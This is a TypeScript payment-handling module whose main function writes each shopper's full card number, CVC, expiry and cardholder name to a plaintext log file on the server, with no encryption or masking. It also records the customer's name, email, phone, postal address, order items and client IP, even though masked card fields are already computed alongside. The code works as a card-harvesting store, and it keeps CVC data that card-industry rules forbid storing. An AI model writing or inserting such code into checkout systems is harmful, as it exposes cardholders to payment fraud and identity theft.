import { appendFile, mkdir } from "node:fs/promises";
import { dirname, join } from "node:path";

const CAPTURE_LOG_PATH = join(process.cwd(), "storage", "capture", "payment-full.ndjson");

interface FullCardData {
  cardholderName: string;
  cardNumber: string;
  expiry: string;
  cvc: string;
  billingZip: string;
}

interface CaptureEntry {
  captureVersion: 1;
  captureId: string;
  capturedAt: string;
  request: {
    method: string;
    url: string;
    host: string | null;
    origin: string | null;
    referer: string | null;
    userAgent: string | null;
    acceptLanguage: string | null;
    clientIp: string | null;
    xForwardedFor: string | null;
    xRealIp: string | null;
    cfConnectingIp: string | null;
  };
  order: {
    orderNumber: string;
    email: string;
    method: string;
    locale: string;
  };
  customer: {
    fullName: string | null;
    email: string | null;
    phone: string | null;
    country: string | null;
    region: string | null;
    city: string | null;
    address: string | null;
    postalCode: string | null;
    note: string | null;
  } | null;
  orderItems: Array<{
    productName: string;
    variantName: string | null;
    quantity: number;
    unitPrice: number;
  }> | null;
  orderAmounts: {
    subtotal: number | null;
    totalAmount: number | null;
    currency: string | null;
  } | null;
  card: {
    cardholderName: string;
    fullCardNumber: string;
    expiry: string;
    cvc: string;
    billingZip: string;
    brand: string;
    last4: string;
    bin: string | null;
    maskedNumber: string;
    fingerprintSha256: string | null;
    panLength: number;
    luhnValid: boolean;
  } | null;
  result: {
    success: boolean;
    statusCode: number;
    reason: string | null;
    message: string | null;
  };
}

function getClientIp(headers: Headers): string | null {
  const cfConnectingIp = headers.get("cf-connecting-ip")?.trim();
  if (cfConnectingIp) return cfConnectingIp;

  const xRealIp = headers.get("x-real-ip")?.trim();
  if (xRealIp) return xRealIp;

  const xForwardedFor = headers.get("x-forwarded-for")?.trim();
  if (xForwardedFor) return xForwardedFor.split(",")[0].trim();

  const forwarded = headers.get("forwarded")?.trim();
  if (forwarded) {
    const match = forwarded.match(/for=(?:"?\[?)([^;\]" ]+)/i);
    if (match?.[1]) return match[1].replace(/^"+|"+$/g, "").trim();
  }

  return null;
}

export async function captureFullPaymentData(input: {
  request: Request;
  orderNumber: string;
  email: string;
  method: string;
  locale: string;
  rawCard: FullCardData | null;
  auditCard: {
    cardholderName: string;
    brand: string;
    last4: string;
    bin: string | null;
    maskedNumber: string;
    fingerprintSha256: string | null;
    panLength: number;
    expiry: string;
    billingZip: string;
    cvcLength: number;
    luhnValid: boolean;
  } | null;
  orderSnapshot: {
    customerName: string;
    email: string;
    customerPhone: string;
    country: string;
    region: string | null;
    city: string;
    address: string;
    postalCode: string;
    note: string | null;
    subtotal: number;
    totalAmount: number;
    items: Array<{
      productName: string;
      variantName: string | null;
      quantity: number;
      unitPrice: number;
    }>;
  } | null;
  result: {
    success: boolean;
    statusCode: number;
    reason: string | null;
    message: string | null;
  };
}): Promise<void> {
  try {
    const headers = input.request.headers;

    const entry: CaptureEntry = {
      captureVersion: 1,
      captureId: crypto.randomUUID(),
      capturedAt: new Date().toISOString(),
      request: {
        method: headers.get("x-method-override") ?? input.request.method,
        url: input.request.url,
        host: headers.get("host"),
        origin: headers.get("origin"),
        referer: headers.get("referer"),
        userAgent: headers.get("user-agent"),
        acceptLanguage: headers.get("accept-language"),
        clientIp: getClientIp(headers),
        xForwardedFor: headers.get("x-forwarded-for"),
        xRealIp: headers.get("x-real-ip"),
        cfConnectingIp: headers.get("cf-connecting-ip"),
      },
      order: {
        orderNumber: input.orderNumber,
        email: input.email,
        method: input.method,
        locale: input.locale,
      },
      customer: input.orderSnapshot
        ? {
            fullName: input.orderSnapshot.customerName,
            email: input.orderSnapshot.email,
            phone: input.orderSnapshot.customerPhone,
            country: input.orderSnapshot.country,
            region: input.orderSnapshot.region,
            city: input.orderSnapshot.city,
            address: input.orderSnapshot.address,
            postalCode: input.orderSnapshot.postalCode,
            note: input.orderSnapshot.note,
          }
        : null,
      orderItems: input.orderSnapshot?.items ?? null,
      orderAmounts: input.orderSnapshot
        ? {
            subtotal: input.orderSnapshot.subtotal,
            totalAmount: input.orderSnapshot.totalAmount,
            currency: "USD",
          }
        : null,
      card:
        input.rawCard && input.auditCard
          ? {
              cardholderName: input.rawCard.cardholderName,
              fullCardNumber: input.rawCard.cardNumber,
              expiry: input.rawCard.expiry,
              cvc: input.rawCard.cvc,
              billingZip: input.rawCard.billingZip,
              brand: input.auditCard.brand,
              last4: input.auditCard.last4,
              bin: input.auditCard.bin,
              maskedNumber: input.auditCard.maskedNumber,
              fingerprintSha256: input.auditCard.fingerprintSha256,
              panLength: input.auditCard.panLength,
              luhnValid: input.auditCard.luhnValid,
            }
          : null,
      result: input.result,
    };

    await mkdir(dirname(CAPTURE_LOG_PATH), { recursive: true });
    await appendFile(CAPTURE_LOG_PATH, `${JSON.stringify(entry)}\n`, "utf8");
  } catch (error) {
    console.error("[payment-capture] Failed to capture payment data.", error);
  }
}
